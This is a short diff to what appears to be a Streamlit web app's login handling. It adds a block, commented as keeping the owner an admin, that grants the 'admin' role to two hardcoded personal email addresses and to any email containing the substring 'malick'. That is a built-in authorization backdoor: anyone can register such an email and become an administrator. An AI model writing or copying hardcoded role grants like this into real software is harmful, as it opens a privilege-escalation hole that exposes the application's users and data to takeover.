@@ -2190,6 +2190,12 @@ if "_pending_auth" in st.session_state:
         st.query_params["t"] = _tok
     st.rerun()
 
+# Ensure system owner (Malick Trabi) accounts always hold the admin role
+if st.session_state.get("authenticated"):
+    _em = str(st.session_state.get("user_email", "")).lower()
+    if _em in ("malicktra99@gmail.com", "malicktra90@gmail.com") or "malick" in _em:
+        st.session_state["user_role"] = "admin"
+
 # ── 4. Periodically purge expired tokens (lightweight, ~1ms) ─────────────────
 try:
     purge_expired()
